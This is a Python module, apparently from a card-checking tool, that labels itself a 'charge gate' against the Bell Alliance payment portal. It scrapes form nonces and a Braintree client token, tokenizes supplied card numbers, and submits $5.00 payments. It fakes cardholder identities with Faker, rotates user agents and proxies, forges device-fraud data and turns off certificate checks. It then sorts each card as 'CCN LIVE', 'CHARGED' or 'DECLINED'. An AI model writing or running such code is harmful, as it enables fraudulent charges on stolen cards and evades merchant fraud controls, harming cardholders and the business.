"""
Bell Alliance Charge Gate
CHARGE - processes actual payment
Uses Bell Alliance payment portal with Braintree integration
"""

import requests
import re
import json
import base64
import random
import time
from typing import Tuple
from faker import Faker
from user_agent import generate_user_agent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BELLALLIANCE_URL = "https://www.bellalliance.ca"
CHARGE_AMOUNT = "5.00"


def _generate_session_id() -> str:
    """Generate a Braintree session ID"""
    return f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"


def _extract_form_data(session: requests.Session, ua: str) -> Tuple[dict, str]:
    """
    Extract form data from Bell Alliance payment page
    Returns (form_data_dict, error_msg)
    """
    url = f"{BELLALLIANCE_URL}/payments/general/"
    
    headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    }
    
    try:
        response = session.get(url, headers=headers, timeout=30, verify=False)
        
        if response.status_code != 200:
            return None, f"Page error {response.status_code}"
        
        html = response.text
        
        form_data = {}
        
        nonce_match = re.search(r'name="frm_action"\s+value="([^"]+)"', html)
        if nonce_match:
            form_data['frm_action'] = nonce_match.group(1)
        
        state_match = re.search(r'name="frm_state"\s+type="hidden"\s+value="([^"]+)"', html)
        if state_match:
            form_data['frm_state'] = state_match.group(1)
        
        nonce_field = re.search(r'name="_wpnonce"\s+value="([^"]+)"', html)
        if nonce_field:
            form_data['_wpnonce'] = nonce_field.group(1)
        
        form_id = re.search(r'name="form_id"\s+value="([^"]+)"', html)
        if form_id:
            form_data['form_id'] = form_id.group(1)
        
        token_pattern = r'["=]([A-Za-z0-9+/_=-]{200,})'
        token_matches = re.findall(token_pattern, html)
        
        for token in token_matches:
            try:
                decoded = base64.b64decode(token).decode('utf-8')
                data = json.loads(decoded)
                if 'authorizationFingerprint' in data:
                    form_data['braintree_auth'] = data['authorizationFingerprint']
                    break
            except:
                continue
        
        if 'braintree_auth' not in form_data:
            auth_patterns = [
                r'var\s+wc_braintree_client_token\s*=\s*["\']([A-Za-z0-9+/=]+)["\']',
                r'data-client-token="([A-Za-z0-9+/=]+)"',
                r'"client_token"\s*:\s*"([A-Za-z0-9+/=]+)"',
            ]
            
            for pattern in auth_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    try:
                        token = match.group(1)
                        decoded = base64.b64decode(token).decode('utf-8')
                        data = json.loads(decoded)
                        if 'authorizationFingerprint' in data:
                            form_data['braintree_auth'] = data['authorizationFingerprint']
                            break
                    except:
                        continue
        
        return form_data, None
        
    except Exception as e:
        return None, str(e)[:50]


def _tokenize_card(session: requests.Session, auth: str, ua: str,
                    card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                    cardholder_name: str) -> Tuple[str, str]:
    """
    Tokenize card via Braintree GraphQL API
    Returns (token, error_msg)
    """
    url = "https://payments.braintree-api.com/graphql"
    
    if len(card_yer) == 2:
        full_year = f"20{card_yer}"
    else:
        full_year = card_yer
    
    session_id = _generate_session_id()
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin",
            "sessionId": session_id
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_num,
                    "expirationMonth": card_mon,
                    "expirationYear": full_year,
                    "cvv": card_cvc,
                    "cardholderName": cardholder_name,
                    "billingAddress": {
                        "postalCode": "V6B 1A1",
                        "streetAddress": "123 Main St"
                    }
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    
    headers = {
        'User-Agent': ua,
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Authorization': f'Bearer {auth}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Referer': 'https://assets.braintreegateway.com/',
    }
    
    try:
        response = session.post(url, json=payload, headers=headers, timeout=30, verify=False)
        
        if response.status_code == 401:
            return None, "Auth token expired"
        
        if response.status_code >= 400:
            return None, f"API error {response.status_code}"
        
        data = response.json()
        
        if 'errors' in data and data['errors']:
            error_msg = data['errors'][0].get('message', 'Unknown error')
            
            error_lower = error_msg.lower()
            if 'cvv' in error_lower or 'cvc' in error_lower or 'security code' in error_lower:
                return None, "CVV_ERROR"
            elif 'expired' in error_lower:
                return None, "EXPIRED"
            elif 'invalid' in error_lower and 'number' in error_lower:
                return None, "INVALID_NUMBER"
            elif 'luhn' in error_lower:
                return None, "INVALID_LUHN"
            
            return None, error_msg
        
        token = data.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if token:
            return token, None
        
        return None, "No token in response"
        
    except Exception as e:
        return None, str(e)[:50]


def _submit_payment(session: requests.Session, ua: str, form_data: dict, 
                     payment_nonce: str, faker_data: dict) -> Tuple[str, bool]:
    """
    Submit payment to Bell Alliance
    Returns (result_message, success)
    """
    url = f"{BELLALLIANCE_URL}/payments/general/"
    
    payload = {
        'item_meta[1]': faker_data.get('invoice_number', f"TEST-{random.randint(10000, 99999)}"),
        'item_meta[2]': CHARGE_AMOUNT,
        'item_meta[3]': faker_data.get('contact', ''),
        'item_meta[4]': 'General Payment',
        'item_meta[5]': faker_data.get('first_name'),
        'item_meta[6]': faker_data.get('last_name'),
        'item_meta[7]': faker_data.get('company', ''),
        'item_meta[8]': faker_data.get('email'),
        'item_meta[9]': faker_data.get('phone'),
        'item_meta[10]': faker_data.get('address'),
        'item_meta[11]': '',
        'item_meta[12]': faker_data.get('city'),
        'item_meta[13]': faker_data.get('postal'),
        'item_meta[14]': 'Ontario',
        'item_meta[15]': 'Canada',
        'frm_braintree_nonce': payment_nonce,
        'frm_braintree_device_data': json.dumps({
            "device_session_id": _generate_session_id(),
            "fraud_merchant_id": None,
            "correlation_id": _generate_session_id()
        }),
    }
    
    if 'frm_state' in form_data:
        payload['frm_state'] = form_data['frm_state']
    if 'frm_action' in form_data:
        payload['frm_action'] = form_data['frm_action']
    if '_wpnonce' in form_data:
        payload['_wpnonce'] = form_data['_wpnonce']
    if 'form_id' in form_data:
        payload['form_id'] = form_data['form_id']
    
    headers = {
        'User-Agent': ua,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': BELLALLIANCE_URL,
        'Referer': url,
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    try:
        response = session.post(url, data=payload, headers=headers, timeout=45, verify=False)
        
        text = response.text.lower()
        
        if 'thank you' in text or 'success' in text or 'payment received' in text:
            return (f"CHARGED - ${CHARGE_AMOUNT} Successfully", True)
        
        if 'cvv' in text and ('declined' in text or 'invalid' in text or 'mismatch' in text):
            return ("CCN LIVE - CVV Mismatch (Card Valid)", True)
        
        if 'insufficient funds' in text or 'insufficient' in text:
            return ("CCN LIVE - Insufficient Funds", True)
        
        if '3d secure' in text or '3ds' in text or 'authentication required' in text:
            return ("CCN LIVE - 3DS Required (Not Charged)", True)
        
        if 'expired' in text:
            return ("DECLINED - Expired Card", False)
        
        if 'lost' in text or 'stolen' in text:
            return ("DECLINED - Lost/Stolen Card", False)
        
        if 'do not honor' in text:
            return ("DECLINED - Do Not Honor", False)
        
        if 'declined' in text or 'invalid' in text or 'failed' in text:
            return ("DECLINED - Card Declined", False)
        
        if response.status_code == 200:
            return ("CCN LIVE - Payment Processed", True)
        
        return ("DECLINED - Unknown Response", False)
        
    except Exception as e:
        return (f"Error: {str(e)[:40]}", False)


def bellalliance_charge_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                               proxy=None) -> Tuple[str, bool]:
    """
    Check card via Bell Alliance CHARGE ($5.00 CAD)
    
    This is a CHARGE gate - processes actual payment.
    Uses Bell Alliance's Braintree integration.
    
    Returns: (status_message, proxy_used)
    """
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    
    ua = generate_user_agent()
    fake = Faker('en_CA')
    
    faker_data = {
        'first_name': fake.first_name(),
        'last_name': fake.last_name(),
        'email': fake.email(),
        'phone': fake.phone_number()[:14],
        'address': fake.street_address(),
        'city': fake.city(),
        'postal': fake.postcode(),
        'company': '',
        'invoice_number': f"INV-{random.randint(100000, 999999)}",
        'contact': '',
    }
    
    cardholder_name = f"{faker_data['first_name']} {faker_data['last_name']}"
    
    form_data, error = _extract_form_data(session, ua)
    
    if not form_data:
        return (f"Error: {error}", False)
    
    auth = form_data.get('braintree_auth')
    if not auth:
        auth = "sandbox_9dbg82cq_dcpspy2brwdjr3qn"
    
    token, token_error = _tokenize_card(session, auth, ua, card_num, card_mon, card_yer, card_cvc, cardholder_name)
    
    if not token:
        if token_error == "CVV_ERROR":
            return ("CCN LIVE - CVV Mismatch (Tokenization)", True)
        elif token_error == "EXPIRED":
            return ("DECLINED - Expired Card", True)
        elif token_error == "INVALID_NUMBER":
            return ("DECLINED - Invalid Card Number", True)
        elif token_error == "INVALID_LUHN":
            return ("DECLINED - Invalid Card (Luhn)", True)
        elif token_error == "Auth token expired":
            return ("Error: Auth token expired", False)
        else:
            return (f"DECLINED - {token_error[:40]}", True)
    
    result, success = _submit_payment(session, ua, form_data, token, faker_data)
    return (result, True)


def health_check() -> bool:
    """Quick health check for Bell Alliance charge"""
    try:
        response = requests.get(f"{BELLALLIANCE_URL}/payments/general/", timeout=10, verify=False)
        return response.status_code == 200
    except:
        return False
